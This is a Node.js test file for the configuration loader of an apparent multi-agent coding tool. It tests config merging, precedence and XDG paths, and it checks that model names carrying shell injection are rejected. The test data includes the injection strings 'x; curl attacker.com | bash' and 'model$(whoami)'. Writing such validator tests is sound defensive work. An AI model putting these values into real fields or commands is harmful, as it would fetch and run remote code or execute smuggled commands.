import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

import {
  CoderConfigSchema,
  deepMerge,
  loadConfig,
  resolveConfig,
  userConfigDir,
  userConfigPath,
} from "../src/config.js";

test("deepMerge: arrays replace, not concat", () => {
  const base = { items: [1, 2, 3] };
  const override = { items: [4, 5] };
  const result = deepMerge(base, override);
  assert.deepEqual(result, { items: [4, 5] });
});

test("deepMerge: null values override", () => {
  const base = { a: { b: 1 } };
  const override = { a: null };
  const result = deepMerge(base, override);
  assert.equal(result.a, null);
});

test("deepMerge: undefined values are skipped", () => {
  const base = { a: 1, b: 2 };
  const override = { a: undefined, b: 3 };
  const result = deepMerge(base, override);
  assert.deepEqual(result, { a: 1, b: 3 });
});

test("loadConfig: no files returns all defaults", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = loadConfig(dir);
  const defaults = CoderConfigSchema.parse({});
  assert.deepEqual(config, defaults);
});

test("loadConfig: user config only merges with defaults", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const xdg = mkdtempSync(path.join(os.tmpdir(), "coder-xdg-"));
  mkdirSync(path.join(xdg, "coder"), { recursive: true });
  writeFileSync(
    path.join(xdg, "coder", "config.json"),
    JSON.stringify({
      verbose: true,
      models: { claude: "claude-sonnet-4-5-20250929" },
    }),
  );

  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = xdg;
  try {
    const config = loadConfig(dir);
    assert.equal(config.verbose, true);
    assert.equal(config.models.claude, "claude-sonnet-4-5-20250929");
    assert.equal(config.models.gemini, "gemini-3.1-pro-preview"); // default preserved
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("loadConfig: repo config overrides user config", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const xdg = mkdtempSync(path.join(os.tmpdir(), "coder-xdg-"));
  mkdirSync(path.join(xdg, "coder"), { recursive: true });
  writeFileSync(
    path.join(xdg, "coder", "config.json"),
    JSON.stringify({ ppcommit: { blockTodos: false }, verbose: true }),
  );
  writeFileSync(
    path.join(dir, "coder.json"),
    JSON.stringify({ ppcommit: { blockTodos: true }, verbose: false }),
  );

  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = xdg;
  try {
    const config = loadConfig(dir);
    assert.equal(config.ppcommit.blockTodos, true); // repo wins
    assert.equal(config.verbose, false); // repo wins
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("resolveConfig: CLI overrides win over all", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  writeFileSync(
    path.join(dir, "coder.json"),
    JSON.stringify({ verbose: false }),
  );
  const config = resolveConfig(dir, { verbose: true });
  assert.equal(config.verbose, true);
});

test("resolveConfig: deep overrides merge correctly", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, { test: { command: "npm test" } });
  assert.equal(config.test.command, "npm test");
  assert.equal(config.test.timeoutMs, 600000); // default preserved
});

test("resolveConfig: workflow agent roles can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    workflow: {
      agentRoles: {
        planner: "codex",
        programmer: "codex",
        reviewer: "claude",
      },
    },
  });
  assert.equal(config.workflow.agentRoles.issueSelector, "gemini");
  assert.equal(config.workflow.agentRoles.planner, "codex");
  assert.equal(config.workflow.agentRoles.programmer, "codex");
  assert.equal(config.workflow.agentRoles.reviewer, "claude");
  assert.equal(config.workflow.wip.push, true);
  assert.equal(config.workflow.wip.autoCommit, true);
  assert.equal(config.workflow.scratchpad.sqliteSync, true);
});

test("resolveConfig: workflow durability settings can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    workflow: {
      wip: {
        push: true,
        autoCommit: false,
        includeUntracked: true,
        remote: "backup",
      },
      scratchpad: {
        sqliteSync: true,
        sqlitePath: ".coder/custom-state.db",
      },
    },
  });
  assert.equal(config.workflow.wip.push, true);
  assert.equal(config.workflow.wip.autoCommit, false);
  assert.equal(config.workflow.wip.includeUntracked, true);
  assert.equal(config.workflow.wip.remote, "backup");
  assert.equal(config.workflow.scratchpad.sqlitePath, ".coder/custom-state.db");
});

test("resolveConfig: ppcommit llm settings can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    ppcommit: {
      enableLlm: false,
      llmServiceUrl: "https://example.com/v1",
      llmApiKeyEnv: "MY_LLM_API_KEY",
      llmModel: "my-model",
    },
  });
  assert.equal(config.ppcommit.enableLlm, false);
  assert.equal(config.ppcommit.llmServiceUrl, "https://example.com/v1");
  assert.equal(config.ppcommit.llmApiKeyEnv, "MY_LLM_API_KEY");
  assert.equal(config.ppcommit.llmModel, "my-model");
});

test("userConfigPath: respects XDG_CONFIG_HOME", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = "/custom/config";
  try {
    assert.equal(userConfigPath(), "/custom/config/coder/config.json");
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("userConfigDir: respects XDG_CONFIG_HOME", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = "/custom/config";
  try {
    assert.equal(userConfigDir(), "/custom/config/coder");
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("userConfigPath: falls back to ~/.config", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  delete process.env.XDG_CONFIG_HOME;
  try {
    const expected = path.join(os.homedir(), ".config", "coder", "config.json");
    assert.equal(userConfigPath(), expected);
  } finally {
    if (origXdg !== undefined) process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("CoderConfigSchema rejects model names with shell injection characters", () => {
  assert.throws(
    () =>
      CoderConfigSchema.parse({
        models: { gemini: "x; curl attacker.com | bash" },
      }),
    /Invalid model name/,
  );
  assert.throws(
    () =>
      CoderConfigSchema.parse({
        models: { claude: "model$(whoami)" },
      }),
    /Invalid model name/,
  );
  // Valid model names should pass
  const parsed = CoderConfigSchema.parse({
    models: { gemini: "gemini-2.5-flash", claude: "claude-opus-4-6" },
  });
  assert.equal(parsed.models.gemini, "gemini-2.5-flash");
  assert.equal(parsed.models.claude, "claude-opus-4-6");
});

test("CoderConfigSchema accepts model names with slashes and dots", () => {
  const parsed = CoderConfigSchema.parse({
    models: { gemini: "models/gemini-2.5-flash-preview" },
  });
  assert.equal(parsed.models.gemini, "models/gemini-2.5-flash-preview");
});
